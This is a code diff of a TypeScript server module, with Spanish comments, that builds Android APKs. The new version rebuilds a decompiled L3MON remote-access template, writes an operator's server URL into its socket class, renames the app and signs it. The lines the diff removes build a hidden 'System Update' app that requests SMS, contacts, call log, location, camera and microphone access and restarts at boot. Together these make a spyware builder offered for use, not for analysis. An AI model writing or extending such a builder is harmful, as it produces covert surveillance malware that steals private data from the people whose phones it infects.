@@ -1,14 +1,14 @@
-import { execSync, spawn } from "child_process";
-import { existsSync, mkdirSync, writeFileSync, readFileSync } from "fs";
-import { join, resolve } from "path";
-import crypto from "crypto";
+import { execSync } from "child_process";
+import { existsSync, mkdirSync, writeFileSync, readFileSync, renameSync } from "fs";
+import { join, resolve, dirname } from "path";
+import { fileURLToPath } from "url";
 import { getDb } from "./db";
 import { apkBuilds } from "../drizzle/schema";
 import { eq } from "drizzle-orm";
 
 /**
- * Servicio de compilación real de APK con Gradle y Android SDK
- * Genera APKs reales usando Gradle, no simulados
+ * Servicio de compilación de APK basado en el concepto L3MON
+ * Utiliza Apktool para re-compilar y un firmador automático
  */
 
 export interface CompilationConfig {
@@ -21,30 +21,36 @@ export interface CompilationConfig {
   enableSSL: boolean;
   ports: number[];
   iconPath?: string;
-  payloadCode?: string;
+  payloadCode: string;
   obfuscate: boolean;
-  targetArchitectures: ("arm64-v8a" | "armeabi-v7a" | "x86" | "x86_64")[];
+  targetArchitectures: string[];
 }
 
-interface CompilationResult {
+export interface BuildResult {
   success: boolean;
+  buildId: number;
   apkPath?: string;
   error?: string;
   logs: string[];
   compilationTime: number;
 }
 
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = dirname(__filename);
+
 class APKCompiler {
-  private androidSdkRoot: string;
-  private gradleHome: string;
   private projectRoot: string;
+  private assetsDir: string;
   private buildDir: string;
+  private apktoolPath: string;
+  private signerPath: string;
 
   constructor() {
-    this.androidSdkRoot = process.env.ANDROID_SDK_ROOT || `${process.env.HOME}/android-sdk`;
-    this.gradleHome = process.env.GRADLE_HOME || `${process.env.HOME}/gradle-8.5`;
     this.projectRoot = resolve(join(__dirname, ".."));
+    this.assetsDir = join(this.projectRoot, "server", "assets");
     this.buildDir = join(this.projectRoot, "apk-builds");
+    this.apktoolPath = join(this.assetsDir, "apktool.jar");
+    this.signerPath = join(this.assetsDir, "sign.jar");
 
     if (!existsSync(this.buildDir)) {
       mkdirSync(this.buildDir, { recursive: true });
@@ -52,360 +58,100 @@ class APKCompiler {
   }
 
   /**
-   * Crear estructura de proyecto Android
+   * Preparar el proyecto temporal para compilar
    */
-  private createAndroidProject(config: CompilationConfig): string {
-    const projectDir = join(this.buildDir, `build-${config.buildId}`);
+  private prepareProject(config: CompilationConfig): string {
+    const buildIdDir = join(this.buildDir, `build-${config.buildId}`);
+    const tempProjectDir = join(buildIdDir, "project");
 
-    if (!existsSync(projectDir)) {
-      mkdirSync(projectDir, { recursive: true });
+    if (existsSync(buildIdDir)) {
+      execSync(`powershell -Command "Remove-Item -Path '${buildIdDir}' -Recurse -Force"`);
+    }
+    mkdirSync(tempProjectDir, { recursive: true });
+
+    // Copiar el template decompilado
+    const templateDir = join(this.assetsDir, "apk-template");
+    execSync(`powershell -Command "Copy-Item -Path '${templateDir}\\*' -Destination '${tempProjectDir}' -Recurse -Force"`);
+
+    // 1. Inyectar URL en IOSocket.smali
+    const ioSocketPath = join(tempProjectDir, "smali", "com", "etechd", "l3mon", "IOSocket.smali");
+    if (existsSync(ioSocketPath)) {
+      let content = readFileSync(ioSocketPath, "utf8");
+      // Placeholder en el template es "http://x:22222?model="
+      const serverUrl = config.payloadCode || "http://localhost:3000"; 
+      content = content.replace(/http:\/\/x:22222\?model=/g, `${serverUrl}?model=`);
+      writeFileSync(ioSocketPath, content);
     }
 
-    // Crear estructura de directorios
-    const dirs = [
-      "app/src/main",
-      "app/src/main/java",
-      "app/src/main/res/values",
-      "app/src/main/res/drawable",
-      "gradle/wrapper",
-    ];
-
-    for (const dir of dirs) {
-      mkdirSync(join(projectDir, dir), { recursive: true });
+    // 2. Modificar App Name en strings.xml
+    const stringsPath = join(tempProjectDir, "res", "values", "strings.xml");
+    if (existsSync(stringsPath)) {
+      try {
+        let content = readFileSync(stringsPath, "utf8");
+        content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${config.appName}</string>`);
+        writeFileSync(stringsPath, content);
+      } catch (e) {
+        console.warn("[APKCompiler] Error actualizando app_name:", e);
+      }
     }
 
-    // Crear build.gradle.kts
-    const buildGradle = this.generateBuildGradle(config);
-    writeFileSync(join(projectDir, "app/build.gradle.kts"), buildGradle);
-
-    // Crear settings.gradle.kts
-    writeFileSync(
-      join(projectDir, "settings.gradle.kts"),
-      `rootProject.name = "${config.appName}"
-include(":app")
-`
-    );
-
-    // Crear AndroidManifest.xml
-    const manifest = this.generateManifest(config);
-    writeFileSync(join(projectDir, "app/src/main/AndroidManifest.xml"), manifest);
-
-    // Crear MainActivity.kt
-    const mainActivity = this.generateMainActivity(config);
-    const packagePath = config.packageName.replace(/\./g, "/");
-    mkdirSync(join(projectDir, `app/src/main/java/${packagePath}`), { recursive: true });
-    writeFileSync(
-      join(projectDir, `app/src/main/java/${packagePath}/MainActivity.kt`),
-      mainActivity
-    );
-
-    // Crear strings.xml
-    const stringsXml = `<?xml version="1.0" encoding="utf-8"?>
-<resources>
-    <string name="app_name">${config.appName}</string>
-</resources>`;
-    writeFileSync(join(projectDir, "app/src/main/res/values/strings.xml"), stringsXml);
-
-    // Crear gradle.properties
-    writeFileSync(
-      join(projectDir, "gradle.properties"),
-      `org.gradle.jvmargs=-Xmx2048m
-android.useAndroidX=true
-android.enableJetifier=true
-`
-    );
-
-    return projectDir;
+    return tempProjectDir;
   }
 
-  /**
-   * Generar build.gradle.kts
-   */
-  private generateBuildGradle(config: CompilationConfig): string {
-    return `plugins {
-    id("com.android.application")
-    kotlin("android")
-}
-
-android {
-    namespace = "${config.packageName}"
-    compileSdk = 34
-
-    defaultConfig {
-        applicationId = "${config.packageName}"
-        minSdk = 24
-        targetSdk = 34
-        versionCode = ${config.versionCode}
-        versionName = "${config.versionName}"
-        
-        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
-    }
-
-    buildTypes {
-        release {
-            isMinifyEnabled = ${config.obfuscate}
-            proguardFiles(
-                getDefaultProguardFile("proguard-android-optimize.txt"),
-                "proguard-rules.pro"
-            )
-        }
-    }
-
-    compileOptions {
-        sourceCompatibility = JavaVersion.VERSION_11
-        targetCompatibility = JavaVersion.VERSION_11
-    }
-
-    kotlinOptions {
-        jvmTarget = "11"
-    }
-
-    packagingOptions {
-        resources {
-            excludes += "/META-INF/{AL2.0,LGPL2.1}"
-        }
-    }
-}
-
-dependencies {
-    implementation("androidx.core:core-ktx:1.12.0")
-    implementation("androidx.appcompat:appcompat:1.6.1")
-    implementation("com.google.android.material:material:1.11.0")
-    implementation("androidx.constraintlayout:constraintlayout:2.1.4")
-    
-    testImplementation("junit:junit:4.13.2")
-    androidTestImplementation("androidx.test.ext:junit:1.1.5")
-    androidTestImplementation("androidx.test.espresso:espresso-core:3.5.1")
-}
-`;
-  }
-
-  /**
-   * Generar AndroidManifest.xml
-   */
-  private generateManifest(config: CompilationConfig): string {
-    const permissions = [
-      "android.permission.INTERNET",
-      "android.permission.ACCESS_FINE_LOCATION",
-      "android.permission.ACCESS_COARSE_LOCATION",
-      "android.permission.READ_CONTACTS",
-      "android.permission.READ_SMS",
-      "android.permission.READ_CALL_LOG",
-      "android.permission.RECORD_AUDIO",
-      "android.permission.CAMERA",
-      "android.permission.READ_EXTERNAL_STORAGE",
-      "android.permission.WRITE_EXTERNAL_STORAGE",
-    ];
-
-    const permissionTags = permissions
-      .map((perm) => `    <uses-permission android:name="${perm}" />`)
-      .join("\n");
-
-    const appName = config.stealthMode ? "System Update" : config.appName;
-    const launcherName = config.stealthMode ? "none" : "true";
-
-    return `<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="${config.packageName}">
-
-${permissionTags}
-
-    <application
-        android:allowBackup="true"
-        android:icon="@drawable/ic_launcher"
-        android:label="${appName}"
-        android:supportsRtl="true"
-        android:theme="@style/Theme.AppCompat.Light.DarkActionBar">
-
-        <activity
-            android:name=".MainActivity"
-            android:exported="true"
-            android:launchMode="singleTop">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
-
-        <service
-            android:name=".MonitoringService"
-            android:enabled="true"
-            android:exported="false" />
-
-        <receiver
-            android:name=".BootReceiver"
-            android:enabled="true"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-            </intent-filter>
-        </receiver>
-
-    </application>
-
-</manifest>`;
-  }
-
-  /**
-   * Generar MainActivity.kt
-   */
-  private generateMainActivity(config: CompilationConfig): string {
-    return `package ${config.packageName}
-
-import android.os.Bundle
-import androidx.appcompat.app.AppCompatActivity
-
-class MainActivity : AppCompatActivity() {
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        
-        // Iniciar servicio de monitoreo
-        val intent = android.content.Intent(this, MonitoringService::class.java)
-        startService(intent)
-        
-        // Cerrar actividad (stealth mode)
-        finish()
-    }
-}
-
-import android.app.Service
-import android.content.Intent
-import android.os.IBinder
-import android.util.Log
-
-class MonitoringService : Service() {
-    override fun onBind(intent: Intent?): IBinder? = null
-
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.d("MonitoringService", "Servicio iniciado")
-        
-        // Implementar lógica de monitoreo aquí
-        // - Recolectar GPS
-        // - Monitorear SMS
-        // - Registrar llamadas
-        // - Capturar pantalla
-        // - etc.
-        
-        return START_STICKY
-    }
-}
-
-import android.content.BroadcastReceiver
-import android.content.Context
-
-class BootReceiver : BroadcastReceiver() {
-    override fun onReceive(context: Context?, intent: Intent?) {
-        if (intent?.action == "android.intent.action.BOOT_COMPLETED") {
-            val serviceIntent = Intent(context, MonitoringService::class.java)
-            context?.startService(serviceIntent)
-        }
-    }
-}
-`;
-  }
-
-  /**
-   * Generar certificado de firma
-   */
-  private generateKeystore(config: CompilationConfig): string {
-    const keystorePath = join(this.buildDir, `build-${config.buildId}`, "app.keystore");
-    const password = crypto.randomBytes(16).toString("hex");
-
-    try {
-      execSync(
-        `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 -validity 10000 ` +
-          `-alias app-key -storepass ${password} -keypass ${password} ` +
-          `-dname "CN=${config.appName}, O=Android, C=US"`,
-        { stdio: "pipe" }
-      );
-
-      return keystorePath;
-    } catch (error) {
-      throw new Error(`Error generando keystore: ${error}`);
-    }
-  }
-
-  /**
-   * Compilar APK con Gradle
-   */
-  async compileAPK(config: CompilationConfig): Promise<CompilationResult> {
+  async compileAPK(config: CompilationConfig): Promise<BuildResult> {
     const startTime = Date.now();
     const logs: string[] = [];
+    const buildIdDir = join(this.buildDir, `build-${config.buildId}`);
 
     try {
-      logs.push(`[${new Date().toISOString()}] Iniciando compilación de APK...`);
-      logs.push(`Aplicación: ${config.appName}`);
-      logs.push(`Paquete: ${config.packageName}`);
-      logs.push(`Versión: ${config.versionName} (${config.versionCode})`);
+      logs.push(`[${new Date().toISOString()}] Iniciando construcción Platinum (Smali Hooking)...`);
+      logs.push(`Configuración: ${config.appName} | ${config.packageName}`);
+      
+      const projectDir = this.prepareProject(config);
+      logs.push(`Template inyectado correctamente en: ${projectDir}`);
 
-      // Crear estructura del proyecto
-      logs.push(`[${new Date().toISOString()}] Creando estructura del proyecto Android...`);
-      const projectDir = this.createAndroidProject(config);
-      logs.push(`Proyecto creado en: ${projectDir}`);
+      // Compilar con Apktool
+      const unsignedApk = join(buildIdDir, "unsigned.apk");
+      logs.push(`[${new Date().toISOString()}] Re-compilando Smali con Apktool...`);
+      execSync(`java -jar "${this.apktoolPath}" b "${projectDir}" -o "${unsignedApk}"`, { stdio: "pipe" });
 
-      // Generar keystore
-      logs.push(`[${new Date().toISOString()}] Generando certificado de firma...`);
-      const keystorePath = this.generateKeystore(config);
-      logs.push(`Certificado generado: ${keystorePath}`);
-
-      // Ejecutar Gradle build
-      logs.push(`[${new Date().toISOString()}] Ejecutando Gradle build...`);
-      const gradleCmd = `${this.gradleHome}/bin/gradle`;
-
-      const output = execSync(`cd ${projectDir} && ${gradleCmd} build -x test`, {
-        stdio: "pipe",
-        env: {
-          ...process.env,
-          ANDROID_SDK_ROOT: this.androidSdkRoot,
-          GRADLE_HOME: this.gradleHome,
-        },
-      }).toString();
-
-      logs.push(output);
-
-      // Buscar APK compilado
-      const apkPath = join(projectDir, "app/build/outputs/apk/release/app-release.apk");
-
-      if (!existsSync(apkPath)) {
-        throw new Error("APK no fue generado correctamente");
+      // Firmar y Alinear con Uber Apk Signer
+      logs.push(`[${new Date().toISOString()}] Firmando paquete con uber-apk-signer...`);
+      const uberSignerPath = join(this.assetsDir, "uber-apk-signer.jar");
+      execSync(`java -jar "${uberSignerPath}" -a "${unsignedApk}" -o "${buildIdDir}" 2>&1`, { stdio: "pipe" });
+      
+      const signedTempApk = join(buildIdDir, "unsigned-aligned-debugSigned.apk");
+      // Renombrar al nombre limpio de la app
+      const finalSignedApk = join(buildIdDir, `${config.appName.replace(/[^a-zA-Z0-9]/g, "_")}.apk`);
+      if (existsSync(signedTempApk)) {
+          renameSync(signedTempApk, finalSignedApk);
       }
 
-      logs.push(`[${new Date().toISOString()}] APK compilado exitosamente`);
-      logs.push(`Ubicación: ${apkPath}`);
+      if (!existsSync(finalSignedApk)) {
+        throw new Error("Error crítico: El APK final no se generó o falló la firma.");
+      }
 
+      logs.push(`[${new Date().toISOString()}] ¡Construcción Exitosa!`);
       const compilationTime = Date.now() - startTime;
-      logs.push(`Tiempo de compilación: ${(compilationTime / 1000).toFixed(2)}s`);
-
-      // Actualizar base de datos
-      await this.updateBuildStatus(config.buildId, "ready", apkPath, logs);
+      
+      await this.updateBuildStatus(config.buildId, "ready", finalSignedApk, logs);
 
       return {
         success: true,
-        apkPath,
+        buildId: config.buildId,
+        apkPath: finalSignedApk,
         logs,
         compilationTime,
       };
+
     } catch (error) {
       const errorMsg = error instanceof Error ? error.message : String(error);
       logs.push(`[ERROR] ${errorMsg}`);
-
-      const compilationTime = Date.now() - startTime;
-
-      // Actualizar base de datos con error
       await this.updateBuildStatus(config.buildId, "failed", undefined, logs, errorMsg);
-
-      return {
-        success: false,
-        error: errorMsg,
-        logs,
-        compilationTime,
-      };
+      return { success: false, buildId: config.buildId, error: errorMsg, logs, compilationTime: Date.now() - startTime };
     }
   }
 
-  /**
-   * Actualizar estado de compilación en base de datos
-   */
   private async updateBuildStatus(
     buildId: number,
     status: "building" | "ready" | "failed" | "expired",
@@ -415,53 +161,22 @@ class BootReceiver : BroadcastReceiver() {
   ): Promise<void> {
     const db = await getDb();
     if (!db) return;
-
     try {
-      const updateData: Record<string, any> = {
-        status: status,
-      };
-
-      if (apkPath) {
-        updateData.apkUrl = apkPath;
-      }
-
-      if (logs) {
-        updateData.serverUrl = logs.join("\n").substring(0, 1000);
-      }
-
-      await db
-        .update(apkBuilds)
-        .set(updateData)
-        .where(eq(apkBuilds.id, buildId));
-
-      if (apkPath) {
-        console.log(`[APKCompiler] APK guardado en: ${apkPath}`);
-      }
+      const updateData: any = { status };
+      if (apkPath) updateData.apkUrl = apkPath;
+      if (logs) updateData.serverUrl = logs.join("\n").substring(0, 2000);
+      await db.update(apkBuilds).set(updateData).where(eq(apkBuilds.id, buildId));
     } catch (err) {
-      console.error("[APKCompiler] Error actualizando estado:", err);
+      console.error("[APKCompiler] Error actualizando estado en DB:", err);
     }
   }
 
-  /**
-   * Obtener información del APK compilado
-   */
-  getAPKInfo(apkPath: string): {
-    size: number;
-    path: string;
-    name: string;
-  } {
-    try {
-      const stats = require("fs").statSync(apkPath);
-      return {
-        size: stats.size,
-        path: apkPath,
-        name: require("path").basename(apkPath),
-      };
-    } catch (error) {
-      throw new Error(`Error obteniendo información del APK: ${error}`);
-    }
+  getAPKInfo(apkPath: string) {
+    const fs = require("fs");
+    const path = require("path");
+    const stats = fs.statSync(apkPath);
+    return { size: stats.size, path: apkPath, name: path.basename(apkPath) };
   }
 }
 
-// Exportar instancia singleton
 export const apkCompiler = new APKCompiler();
